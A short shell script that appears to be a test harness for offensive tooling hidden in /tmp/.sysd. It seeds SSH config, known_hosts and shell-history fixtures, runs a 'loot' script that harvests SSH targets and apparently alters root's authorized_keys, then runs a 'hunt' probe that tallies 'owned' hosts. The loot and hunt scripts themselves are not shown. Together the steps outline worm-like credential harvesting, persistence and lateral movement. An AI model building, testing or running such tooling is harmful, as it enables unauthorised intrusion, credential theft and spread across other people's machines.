#!/bin/sh
# throwaway: end-to-end loot test (no $( ) so the Windows/ssh/PS quoting layers
# cannot mangle it)
echo "=== syntax (dash, on host) ==="
sh -n /tmp/.sysd/loot.sh && echo loot_ok
sh -n /tmp/.sysd/hunt.sh && echo hunt_ok

echo
echo "=== fixtures: ssh config, known_hosts, history to parse ==="
mkdir -p /root/.ssh
if [ ! -f /root/.ssh/config ]; then
    cat > /root/.ssh/config <<'EOF'
Host box2
    HostName 5.161.247.9
    User root
    IdentityFile ~/.ssh/id_key

Host self
    HostName 167.233.74.146
    User root
EOF
    echo wrote_config
fi
grep -q 10.77.0.9 /root/.ssh/known_hosts 2>/dev/null || \
    printf '10.77.0.9,10.77.0.10 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLE\n' >> /root/.ssh/known_hosts
grep -q 'deploy@10.99.0.5' /root/.bash_history 2>/dev/null || \
    printf 'ssh deploy@10.99.0.5 -p 2222\n' >> /root/.bash_history
chmod 0600 /root/.ssh/config /root/.ssh/known_hosts
echo fixtures_ready

echo
echo "=== loot run ==="
sh /tmp/.sysd/loot.sh

echo
echo "=== loot.txt (first 30) ==="
head -30 /tmp/.sysd/.hunt/loot.txt
echo "--- total rows ---"
wc -l < /tmp/.sysd/.hunt/loot.txt

echo
echo "=== authorized_keys: before / after a second loot (idempotent?) ==="
wc -l < /root/.ssh/authorized_keys
sh /tmp/.sysd/loot.sh > /dev/null 2>&1
wc -l < /root/.ssh/authorized_keys

echo
echo "=== probe, cap 40 (loot rows must come first) ==="
HUNT_MAX_PROBE=40 sh /tmp/.sysd/hunt.sh probe

echo
echo "=== results ==="
echo -n "owned="; wc -l < /tmp/.sysd/.hunt/owned.txt
echo -n "seen="; wc -l < /tmp/.sysd/.hunt/seen.txt
echo "=== DONE ==="
